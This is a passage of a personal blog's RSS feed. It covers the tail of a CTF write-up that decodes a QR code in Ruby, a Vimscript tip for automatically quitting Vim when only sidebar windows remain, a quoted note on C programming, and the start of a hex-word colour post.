  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;1000&#39;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Kanji&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kanji&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;0000&#39;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Terminate&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;fail&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Unhandled mode &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Fortunately, the QR code contains alphanumeric encoding and byte encoding only. You can get the flag by running above code with Ruby:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SECCON{PSwIQ9d9GjKTdD8H}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/QR_code&quot;&gt;QR code on Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/&quot;&gt;QR Code Tutorial&lt;/a&gt; by &lt;a href=&quot;http://www.thonky.com&quot;&gt;Thonky&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ams.org/samplings/feature-column/fc-2013-02&quot;&gt;How to Read QR Symbols Without Your Mobile Telephone&lt;/a&gt; by Bill Casselman&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 07 Dec 2014 19:02:51 +0900</pubDate>
        <link>http://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/</link>
        <guid isPermaLink="true">http://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/</guid>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        
        <title>Automatically Quit Vim if Actual Files are Closed</title>
        
        <description>&lt;p&gt;&lt;img src=&quot;/images/2014/11/30/vim.png&quot; alt=&quot;Vim&quot; title=&quot;Vim&quot;&gt;&lt;/p&gt;

&lt;h2&gt;Sidebar&lt;/h2&gt;

&lt;p&gt;Many Vim user use plugins which open sidebar like &lt;a href=&quot;https://github.com/scrooloose/nerdtree&quot;&gt;NERDTree&lt;/a&gt; or &lt;a href=&quot;https://github.com/vim-scripts/taglist.vim&quot;&gt;Tag List&lt;/a&gt;. In my case, I always open NERDTree and Tag List on Vim startup. Their file and tag navigation features are extremely handy.&lt;/p&gt;

&lt;p&gt;We use &lt;code&gt;:q&lt;/code&gt; to quit, &lt;code&gt;:q!&lt;/code&gt; or &lt;code&gt;ZQ&lt;/code&gt; to quit without saving, &lt;code&gt;:wq&lt;/code&gt;, &lt;code&gt;:x&lt;/code&gt; or &lt;code&gt;ZZ&lt;/code&gt; to save and quit. But these commands are applied to only one buffer. NERDTree or Tag List windows are not closed until we close them individually or quit all using &lt;code&gt;:qa&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Getting into the Problem&lt;/h2&gt;

&lt;p&gt;But as one of the Vim users, I close it within a few minutes or even a few seconds after I opened it. I want to keep quitting Vim easy. Using &lt;code&gt;:qa&lt;/code&gt; everytime doesn&amp;rsquo;t make sence. Actually, &lt;a href=&quot;https://github.com/scrooloose/nerdtree#faq&quot;&gt;NERDTree gives us a tip&lt;/a&gt; to close Vim if the only window left open is a NERDTree:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;autocmd bufenter * &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; exists&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;b:NERDTreeType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;nv&quot;&gt;b:NERDTreeType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;primary&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If I close the last window when a NERDTree exists, Vim automatically closes. But what if we have Tag List window also? &lt;code&gt;winnr(&amp;quot;$&amp;quot;)&lt;/code&gt; returns the current window count, so the above code triggers only when the window count is 1. So Vim will quit automatically only when NERDTree is the last window.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2&gt;Not Interesting Buffer&lt;/h2&gt;

&lt;p&gt;There are some types of window which isn&amp;rsquo;t important while quitting Vim.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Help&lt;/p&gt;

&lt;p&gt;We can look up documentation of Vim itself or its plugins by &lt;code&gt;:help&lt;/code&gt; or &lt;code&gt;:h&lt;/code&gt; command. This is one of the most powerful features of Vim, but these windows aren&amp;rsquo;t editable and we don&amp;rsquo;t need them while quitting Vim.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;QuickFix&lt;/p&gt;

&lt;p&gt;Some plugins like &lt;a href=&quot;https://github.com/scrooloose/syntastic&quot;&gt;Syntastic&lt;/a&gt; or &lt;a href=&quot;https://github.com/ngmy/vim-rubocop&quot;&gt;Vim RuboCop&lt;/a&gt; show errors on QuickFix window and Vim supports navigating them with &lt;code&gt;:cnext&lt;/code&gt; and &lt;code&gt;:cprev&lt;/code&gt;. There windows aren&amp;rsquo;t needed also.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NERDTree and Tag List&lt;/p&gt;

&lt;p&gt;Here is where we started.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;Investigate the Buffer&lt;/h2&gt;

&lt;p&gt;Vim buffers have its type. Help and QuickFix buffers also have it so we&amp;rsquo;re ready to go. See &lt;code&gt;&amp;#39;buftype&amp;#39;&lt;/code&gt; documentation:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;                        *&lt;span class=&quot;s1&quot;&gt;&#39;buftype&#39;&lt;/span&gt;* *&lt;span class=&quot;s1&quot;&gt;&#39;bt&#39;&lt;/span&gt;* *E382*
&lt;span class=&quot;s1&quot;&gt;&#39;buftype&#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;bt&#39;&lt;/span&gt;      string &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            local &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; buffer
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;not &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; Vi&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;not available when compiled without the &lt;span class=&quot;p&quot;&gt;|+&lt;/span&gt;quickfix&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;
            feature&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    The value of this &lt;span class=&quot;k&quot;&gt;option&lt;/span&gt; specifies the type of &lt;span class=&quot;k&quot;&gt;a&lt;/span&gt; buffer&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;empty&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;   normal buffer
      nofile    buffer which &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; not related &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; and will not be
            written
      nowrite   buffer which will not be written
      acwrite   buffer which will always be written with &lt;span class=&quot;nb&quot;&gt;BufWriteCmd&lt;/span&gt;
            autocommands&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;not available when compiled without the
            &lt;span class=&quot;p&quot;&gt;|+&lt;/span&gt;autocmd&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; feature&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      quickfix  quickfix buffer&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; contains list of errors &lt;span class=&quot;p&quot;&gt;|:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;cwindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;
            or list of locations &lt;span class=&quot;p&quot;&gt;|:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lwindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;
      help      help buffer &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;you are not supposed &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; this
            manually&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Because &lt;code&gt;quickfix&lt;/code&gt; and &lt;code&gt;help&lt;/code&gt; type is already exists, all we have to do is retrieve that value. This code returns the buftype of current buffer:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;getbufvar&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;amp;buftype&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that &lt;code&gt;winbufnr(0)&lt;/code&gt; returns the number of the buffer in the current window.&lt;/p&gt;

&lt;p&gt;For NERDTree and Tag List, we check the name of the buffer.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;bufname&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;NERDTree has &lt;code&gt;t:NERDTreeBufName&lt;/code&gt; for this, Tag List has same name for every buffer; &lt;code&gt;__Tag_List__&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So we can check whether the current buffer is NERDTree or not with this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;exists&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;t:NERDTreeBufName&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &amp;amp;&amp;amp; bufname&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;NERDTreeBufName
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For Tag List:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;bufname&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__Tag_List__&#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Automatically Quit Vim&lt;/h2&gt;

&lt;p&gt;We can check the current buffer is important or not. Then how can we check that for every buffer? Now do some basic programming.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;!&lt;/span&gt; CheckLeftBuffers&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; tabpagenr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;=&lt;/span&gt; winnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; getbufvar&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;amp;buftype&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;help&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt;
&lt;span class=&quot;se&quot;&gt;          \&lt;/span&gt; getbufvar&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;amp;buftype&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;quickfix&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt;
&lt;span class=&quot;se&quot;&gt;          \&lt;/span&gt; exists&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;t:NERDTreeBufName&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &amp;amp;&amp;amp;
&lt;span class=&quot;se&quot;&gt;          \&lt;/span&gt;   bufname&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;NERDTreeBufName &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt;
&lt;span class=&quot;se&quot;&gt;          \&lt;/span&gt; bufname&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;winbufnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__Tag_List__&#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;endwhile&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; winnr&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;qall&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;
    unlet &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;endfunction&lt;/span&gt;
autocmd &lt;span class=&quot;nb&quot;&gt;BufEnter&lt;/span&gt; * &lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; CheckLeftBuffers&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that &lt;code&gt;CheckLeftBuffers()&lt;/code&gt; will check buffers only when the tab page count is 1. It iterates every window and check its &lt;code&gt;&amp;#39;buftype&amp;#39;&lt;/code&gt; is &lt;code&gt;&amp;#39;help&amp;#39;&lt;/code&gt; or &lt;code&gt;&amp;#39;quickfix&amp;#39;&lt;/code&gt;. If every window is Help window or QuickFix window, &lt;code&gt;i&lt;/code&gt; becomes &lt;code&gt;winnr(&amp;#39;$&amp;#39;) + 1&lt;/code&gt;. Then we&amp;rsquo;re safe to quit all windows by calling &lt;code&gt;qall&lt;/code&gt;. Finally we add &lt;code&gt;CheckLeftBuffers()&lt;/code&gt; to &lt;code&gt;BufEnter *&lt;/code&gt;, so it&amp;rsquo;ll be called on everytime we close a window&amp;mdash;&lt;strong&gt;on the fly!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You can see my actual &lt;a href=&quot;https://github.com/yous/dotfiles/commit/735976604471bb6186d3867a30c421c839ad3ad4&quot;&gt;vimrc commit&lt;/a&gt; and also check out my &lt;a href=&quot;https://github.com/yous/dotfiles&quot;&gt;dotfiles repo&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: In gVim, executing &lt;code&gt;qall&lt;/code&gt; won&amp;rsquo;t work. You can use this line instead of &lt;code&gt;qall&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; feedkeys&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:qall\&amp;lt;CR&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;n&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will work with other Vim distributions. If it doesn&amp;rsquo;t or if you have another problems, feel free to &lt;a href=&quot;https://github.com/yous/dotfiles/issues/new&quot;&gt;make an issue&lt;/a&gt; or &lt;a href=&quot;/about/&quot;&gt;contact me&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Sun, 30 Nov 2014 18:02:45 +0900</pubDate>
        <link>http://yous.be/2014/11/30/automatically-quit-vim-if-actual-files-are-closed/</link>
        <guid isPermaLink="true">http://yous.be/2014/11/30/automatically-quit-vim-if-actual-files-are-closed/</guid>
        
        
        <category>Vim</category>
        
      </item>
    
      <item>
        
        <title>On becoming an expert C programmer &amp;rarr;</title>
        
        <description>&lt;blockquote&gt;
&lt;p&gt;The following is from an EMail message that I sent to to an individual on 12-Apr-2001. You may find this EMail message useful.&lt;/p&gt;

&lt;p&gt;The Writer asked:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;I just recently visited your website &amp;hellip; Just wanted to say greetings and ask a simple question: Do you think I stand a chance in the C programming field if I keep it up? Tell me what I should do in order to keep strong feelings towards C.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Sun, 26 Oct 2014 22:21:30 +0900</pubDate>
        <link>http://yous.be/2014/10/26/on-becoming-an-expert-c-programmer/</link>
        <guid isPermaLink="true">http://yous.be/2014/10/26/on-becoming-an-expert-c-programmer/</guid>
        
        
        <category>Technology</category>
        
      </item>
    
      <item>
        
        <title>Yet Another Hex Word</title>
        
        <description>&lt;p&gt;&lt;img src=&quot;/images/2014/09/21/01de57.svg&quot; alt=&quot;#01de57&quot; title=&quot;#01de57&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/0a7.svg&quot; alt=&quot;#0a7&quot; title=&quot;#0a7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/0dd.svg&quot; alt=&quot;#0dd&quot; title=&quot;#0dd&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/0ff.svg&quot; alt=&quot;#0ff&quot; title=&quot;#0ff&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/0ff1ce.svg&quot; alt=&quot;#0ff1ce&quot; title=&quot;#0ff1ce&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/10ca1e.svg&quot; alt=&quot;#10ca1e&quot; title=&quot;#10ca1e&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/57ab1e.svg&quot; alt=&quot;#57ab1e&quot; title=&quot;#57ab1e&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/5ad.svg&quot; alt=&quot;#5ad&quot; title=&quot;#5ad&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/5afe57.svg&quot; alt=&quot;#5afe57&quot; title=&quot;#5afe57&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/50f7ba11.svg&quot; alt=&quot;#50f7ba11&quot; title=&quot;#50f7ba11&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/70e.svg&quot; alt=&quot;#70e&quot; title=&quot;#70e&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/7a7700.svg&quot; alt=&quot;#7a7700&quot; title=&quot;#7a7700&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/7ab.svg&quot; alt=&quot;#7ab&quot; title=&quot;#7ab&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/7ab1e7.svg&quot; alt=&quot;#7ab1e7&quot; title=&quot;#7ab1e7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/7ea.svg&quot; alt=&quot;#7ea&quot; title=&quot;#7ea&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/ad1da5.svg&quot; alt=&quot;#ad1da5&quot; title=&quot;#ad1da5&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/affec7.svg&quot; alt=&quot;#affec7&quot; title=&quot;#affec7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/b01dface.svg&quot; alt=&quot;#b01dface&quot; title=&quot;#b01dface&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/b0771e.svg&quot; alt=&quot;#b0771e&quot; title=&quot;#b0771e&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/ba11ad.svg&quot; alt=&quot;#ba11ad&quot; title=&quot;#ba11ad&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/ba5eba11.svg&quot; alt=&quot;#ba5eba11&quot; title=&quot;#ba5eba11&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/c0ffee.svg&quot; alt=&quot;#c0ffee&quot; title=&quot;#c0ffee&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/c105e7.svg&quot; alt=&quot;#c105e7&quot; title=&quot;#c105e7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/c105ed.svg&quot; alt=&quot;#c105ed&quot; title=&quot;#c105ed&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/ca7.svg&quot; alt=&quot;#ca7&quot; title=&quot;#ca7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/cafebabe.svg&quot; alt=&quot;#cafebabe&quot; title=&quot;#cafebabe&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/d00d1e.svg&quot; alt=&quot;#d00d1e&quot; title=&quot;#d00d1e&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/d1ab10.svg&quot; alt=&quot;#d1ab10&quot; title=&quot;#d1ab10&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/dad.svg&quot; alt=&quot;#dad&quot; title=&quot;#dad&quot;&gt;
